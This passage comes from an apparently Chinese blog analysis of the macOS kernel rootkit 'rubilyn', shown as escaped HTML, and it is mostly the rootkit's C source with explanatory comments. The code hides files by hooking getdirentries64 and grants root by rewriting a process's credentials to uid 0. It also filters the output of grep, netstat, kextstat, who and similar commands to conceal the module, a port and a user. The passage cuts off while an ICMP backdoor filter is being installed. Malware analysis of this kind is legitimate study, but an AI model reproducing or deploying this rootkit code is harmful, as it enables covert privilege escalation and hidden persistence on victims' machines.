class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; __BSD_VISIBLE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAXNAMLEN 255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[MAXNAMLEN+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此处我们只看下 new_getdirentries64 函数，&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked getdirentries64 and friends */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;register_t&lt;/span&gt; new_getdirentries64(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; getdirentries64_args *uap, &lt;span class=&quot;keyword&quot;&gt;user_ssize_t&lt;/span&gt; *retval)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; bcount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; btot = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; buffersize = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; direntry *dirp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *mem = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; updated = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ret = org_getdirentries64(p,uap,retval); &lt;span class=&quot;comment&quot;&gt;// 调用原函数获取目录信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    btot = buffersize = bcount = *retval;    &lt;span class=&quot;comment&quot;&gt;// 函数返回的字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MALLOC(mem,&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *,bcount,M_TEMP,M_WAITOK);  &lt;span class=&quot;comment&quot;&gt;// 在内核空间分配bcount大小的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(mem == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(ret); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;buf, mem, bcount);  &lt;span class=&quot;comment&quot;&gt;// 将用户空间数据拷贝到刚分配的内核空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dirp = mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;comment&quot;&gt;// 搜索指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(dirp-&amp;gt;d_name,(char*)&amp;amp;k_dir,strlen((char*)&amp;amp;k_dir)) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *next = (char *) dirp + dirp-&amp;gt;d_reclen;    &lt;span class=&quot;comment&quot;&gt;// 下一目录项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; offset = (char *) next - (char *) mem ;	&lt;span class=&quot;comment&quot;&gt;// 当前文件目录项大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcount -= dirp-&amp;gt;d_reclen;   &lt;span class=&quot;comment&quot;&gt;// 递减字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    btot -= dirp-&amp;gt;d_reclen;     &lt;span class=&quot;comment&quot;&gt;// 递减目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcopy(next,dirp,buffersize - offset);   &lt;span class=&quot;comment&quot;&gt;// 覆盖指定文件的目录项，从而实现文件隐藏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    updated = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bcount -= dirp-&amp;gt;d_reclen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            dirp = (struct direntry *) ((char *) dirp + dirp-&amp;gt;d_reclen);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(updated == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            copyout(mem,uap-&amp;gt;buf,btot);     &lt;span class=&quot;comment&quot;&gt;// 将修改后的数据返回给用户空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            *retval = btot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FREE(mem,M_TEMP);   &lt;span class=&quot;comment&quot;&gt;// 释放内核内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3、设置Root进程&quot;&gt;&lt;a href=&quot;#3、设置Root进程&quot; class=&quot;headerlink&quot; title=&quot;3、设置Root进程&quot;&gt;&lt;/a&gt;3、设置Root进程&lt;/h3&gt;&lt;p&gt;先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getroot&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *rootpid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;kauth_cred_t&lt;/span&gt; creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid = proc_find(pid);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!rootpid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_lock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);    &lt;span class=&quot;comment&quot;&gt;// 设置互斥锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = rootpid-&amp;gt;p_ucred;   &lt;span class=&quot;comment&quot;&gt;// 进程属主&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = my_kauth_cred_setuidgid(rootpid-&amp;gt;p_ucred,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// 设置进程属主id为0(root)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid-&amp;gt;p_ucred = creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_unlock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);  &lt;span class=&quot;comment&quot;&gt;// 解锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;a href=&quot;#4、隐藏网络端口、用户名和内核模块&quot; class=&quot;headerlink&quot; title=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;/a&gt;4、隐藏网络端口、用户名和内核模块&lt;/h3&gt;&lt;p&gt;通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked write_nocancel for hiding console stuff */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;new_write_nocancel&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; write_nocancel_args *uap, user_ssize_t* retval)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buffer[MAXBUFFER];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, grep, strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, sysctl,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, kextstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, rubilyn))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, netstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_port))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((strncmp(p-&amp;gt;p_comm,w,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||strncmp(p-&amp;gt;p_comm,who,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_user))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return org_write_nocancel(p,uap,retval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5、设置ICMP 后门&lt;/p&gt;
&lt;p&gt;首先添加IPv4过滤器ip_filter_ipv4：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;/* install IPv4 filter hook */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ipf_addv4(&amp;amp;ip_filter_ipv4, &amp;amp;ip_filter_ipv4_ref);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ip_filter_ipv4结构如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ipf_filter ip_filter_ipv4 = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.name		= &lt;span class=&quot;string&quot;&gt;&quot;rubilyn&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_input	= ipf_input,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_output	= ipf_output,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_detach	= ipf_detach,&lt;/span&gt;&lt;br&gt;&lt;span 